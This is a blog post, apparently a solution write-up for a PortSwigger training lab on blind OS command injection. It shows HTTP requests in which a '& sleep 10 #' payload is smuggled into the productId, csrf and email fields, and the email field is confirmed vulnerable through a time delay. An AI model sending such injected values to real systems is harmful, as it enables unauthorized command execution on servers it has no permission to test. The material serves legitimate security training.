---
layout: post
title:  "PortSwigger - Command Injection - Lab 2"
date:   2024-07-07 18:20
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [command-injection]
categories: [PortSwigger]
---

# Lab 1 - OS Command Injection - Simple Case
>Lab Objective:
This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays">Port Swigger - Lab 2</a>
<br/>
<a href="https://academy.ranakhalil.com/courses/1491236/lectures/38308241">Rana Khalil - Lab2</a>
<br/>



### Solution
<hr/>

#### 1. Intercept  all requests and identify requests accepting user inputs:

```
1. GET /product?productId=1

2. POST /feedback/submit
csrf=tNxq00UNidafvF829JS2Jr5QDZyoy0bQ&name=sdfasdf&email=jaco%40infoseq.co&subject=asdasd&message=asdasd
```


#### 2. Test all inputs for command injection vulnerability:
Append `& sleep 10 #`

```
GET /product?productId=1%26+sleep+10+%23
```
Testing csrf parameter by appending our sleep payload:
```
POST /feedback/submit
csrf=tNxq00UNidafvF829JS2Jr5QDZyoy0bQ%26+sleep+10+%23&name=sdfasdf&email=jaco%40infoseq.co&subject=asdasd&message=asdasd
```
Testing email parameter by appending our sleep payload:
```
POST /feedback/submit
csrf=tNxq00UNidafvF829JS2Jr5QDZyoy0bQ&name=test&email=test%40gmail.com%26+sleep+10+%23&subject=test&message=test
```
Notice the response time was 10 seconds:
![Command Injection - Lab 1 - Response](/images/portswigger/CommandInjection/command_injection_lab_2_response.png)

<hr/>